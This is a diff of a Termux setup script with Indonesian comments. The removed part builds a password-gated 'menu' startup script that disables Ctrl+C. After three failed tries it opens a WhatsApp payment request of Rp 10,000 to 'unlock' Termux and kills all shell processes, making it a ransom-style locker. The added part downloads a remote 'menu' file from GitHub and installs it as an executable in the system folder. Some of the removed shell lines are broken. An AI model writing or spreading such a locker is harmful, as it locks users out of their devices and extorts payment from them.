@@ -1,62 +1,13 @@
 #!/bin/bash
-# Tangkap sinyal CTRL+C (SIGINT) dan arahkan ke fungsi trap_ctrlc
-echo "trap 'trap_ctrlc' SIGINT" >> $PREFIX/etc/menu
-
-# Fungsi yang akan dipanggil saat CTRL+C ditekan
-echo "trap_ctrlc() {" >> $PREFIX/etc/menu
-echo 'echo -e "\nPerintah CTRL+C tidak berfungsi di sini."' >> $PREFIX/etc/menu
-echo "}" >> $PREFIX/etc/menu
-
-echo 'PASSWORD="eek"' >> $PREFIX/etc/menu  # Ganti dengan password yang Anda inginkan
-echo "MAX_ATTEMPTS=3" >> $PREFIX/etc/menu
-echo "ATTEMPT_COUNT=0" >> $PREFIX/etc/menu
-
-# Loop untuk meminta password
-echo "while [ $ATTEMPT_COUNT -lt $MAX_ATTEMPTS ]; do " >> $PREFIX/etc/menu
- echo '   read -sp "Masukkan password: " entered_password ' >> $PREFIX/etc/menu
- echo '   echo "" ' >> $PREFIX/etc/menu # Tambahkan baris baru setelah input
-
-  echo '  if [ "$entered_password" == "$PASSWORD" ]; then' >> $PREFIX/etc/menu
-   echo '     echo "Password benar. Selamat datang!" ' >> $PREFIX/etc/menu
-        
-        # --- Bagian yang sudah ditambahkan dan diperbaiki ---
-        # Periksa apakah file menu di direktori home ada
-        # Jika tidak ada, buat file kosong
-    echo '    if [ ! -f "$PREFIX/etc/menu" ]; then ' >> $PREFIX/etc/menu
-   echo '         cat $PREFIX/etc/menu > "$HOME/menu" ' >> $PREFIX/etc/menu
-      echo '      chmod +x $HOME/menu ' >> $PREFIX/etc/menu
-   echo '     fi ' >> $PREFIX/etc/menu
-
-        # Salin konten file menu dari home ke direktori /etc
-#        cp "$HOME/menu" "$PREFIX/etc/menu"
-    echo '    echo "File menu telah diperbarui." ' >> $PREFIX/etc/menu
-      echo '  cp "$PREFIX/etc/menu" "$HOME/menu" ' >> $PREFIX/etc/menu
-        # --- Akhir bagian yang sudah ditambahkan ---
-
-        # Hapus trap agar CTRL+C berfungsi normal setelah login
-  echo "      trap - SIGINT " >> $PREFIX/etc/menu
-   echo "     exit 0" >> $PREFIX/etc/menu  # Keluar dari skrip dengan sukses
-  echo "  else " >> $PREFIX/etc/menu
-    echo "    ATTEMPT_COUNT=$((ATTEMPT_COUNT + 1))
-        REMAINING_ATTEMPTS=$((MAX_ATTEMPTS - ATTEMPT_COUNT)) " >> $PREFIX/etc/menu
-    echo "    if [ $REMAINING_ATTEMPTS -gt 0 ]; then " >> $PREFIX/etc/menu
-      echo '      echo "Password salah. Sisa percobaan: ' >> $PREFIX/etc/menu echo echo '$REMAINING_ATTEMPTS" ' >> $PREFIX/etc/menu
-      echo "  fi " >> $PREFIX/etc/menu
- echo "   fi" >> $PREFIX/etc/menu
-echo "done" >> $PREFIX/etc/menu
-
-# --- Bagian ini hanya akan dieksekusi jika percobaan habis ---
-echo 'echo "Anda telah salah memasukkan password sebanyak 3 kali." ' >> $PREFIX/etc/menu
-echo 'echo "Semua emulator terminal akan dihentikan..."' >> $PREFIX/etc/menu
-echo 'echo "Silahkan hubungi habibGM"' >> $PREFIX/etc/menu
-echo 'termux-open "https://api.whatsapp.com/send?phone=6281945482681&text=Halo+Admin%2C%0A%0ASaya+ingin+membayar+dengan%0A%0AHarga%3A+Rp+10.000%0A%0Auntuk+membuka+termux+saya+ini" ' >> $PREFIX/etc/menu
-echo "sleep 2" >> $PREFIX/etc/menu # Tunggu 2 detik sebelum menghentikan proses
-
-echo "pkill -f termux " >> $PREFIX/etc/menu # Hentikan proses Termux
-echo "pkill -f sh" >> $PREFIX/etc/menu
-echo "pkill -f zsh" >> $PREFIX/etc/menu
-echo "pkill -f bash" >> $PREFIX/etc/menu
-chmod +x menu
+pkg install wget curl -y
+clear
+echo "sukses install wget curl"
+sleep 2
+clear
+wget https://raw.githubusercontent.com/GMhabib/Termux-Login-2025/refs/heads/main/menu
+clear
+mv menu $PREFIX/etc/menu
+chmod +x $PREFIX/etc/menu
 pkg install neofetch -y
 clear
 echo "neofetch installed"
